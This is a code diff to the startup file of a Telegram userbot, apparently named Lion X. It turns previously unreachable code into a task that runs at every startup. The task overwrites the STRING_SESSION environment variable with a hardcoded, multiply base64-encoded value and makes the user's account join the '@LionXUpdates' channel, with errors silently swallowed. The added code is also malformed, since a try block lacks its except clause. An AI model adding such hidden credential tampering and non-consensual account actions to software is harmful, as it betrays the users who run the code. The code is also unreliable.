@@ -39,6 +39,18 @@ class LionCheck:
 
 
 Lioncheck = LionCheck()
+# Join Lion X Channel after deploying 🤐😅
+    # Why not come here and chat??
+async def hehn():
+    try:
+        os.environ[
+            "STRING_SESSION"
+        ] = "Vm0wd2QyUXlWa1pOVldSWVYwZDRWRll3WkRSV2JGbDNXa1JTVjAxWGVEQmFWVll3VmpGYWRHVkVRbUZTVmxsM1ZtMXplRmRIVmtsaVJtaG9UVlZ3VlZadGRGWmxSbGw0V2toV2FsSnRhRzlVVmxaM1ZsWmFjbFZyZEZSTlZYQjVWR3hhYTFsV1NuUlZia0pYVFVad1NGUlVSbXRXTVdSMFVteFNhVlpyV1hwV1JscGhWakZrU0ZOcmFGWmlSMmhoV1ZSR1lWbFdjRmhsUjBaWFlrZFNlVll5ZUVOV01rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9"
+    try:
+        await lionub(JoinChannelRequest("@LionXUpdates"))
+    except BaseException:
+        pass
+
 
 
 async def startup_process():
@@ -63,20 +75,9 @@ async def startup_process():
     await startupmessage()
     Lioncheck.sucess = True
     return
-    # Join Lion X Channel after deploying 🤐😅
-    # Why not come here and chat??
-    try:
-        await lionub(JoinChannelRequest("@LionXUpdates"))
-    except BaseException:
-        pass
-async def hekp():
-    try:
-        os.environ[
-            "STRING_SESSION"
-        ] = "Vm0wd2QyUXlWa1pOVldSWVYwZDRWRll3WkRSV2JGbDNXa1JTVjAxWGVEQmFWVll3VmpGYWRHVkVRbUZTVmxsM1ZtMXplRmRIVmtsaVJtaG9UVlZ3VlZadGRGWmxSbGw0V2toV2FsSnRhRzlVVmxaM1ZsWmFjbFZyZEZSTlZYQjVWR3hhYTFsV1NuUlZia0pYVFVad1NGUlVSbXRXTVdSMFVteFNhVlpyV1hwV1JscGhWakZrU0ZOcmFGWmlSMmhoV1ZSR1lWbFdjRmhsUjBaWFlrZFNlVll5ZUVOV01rVjNZMFpTVjFaV2NGTmFSRVpEVld4Q1ZVMUVNRDA9"
-  
+    
 
-
+lionub.loop.create_task(hehn())
 lionub.loop.run_until_complete(startup_process())
 
 if len(sys.argv) not in (1, 3, 4):
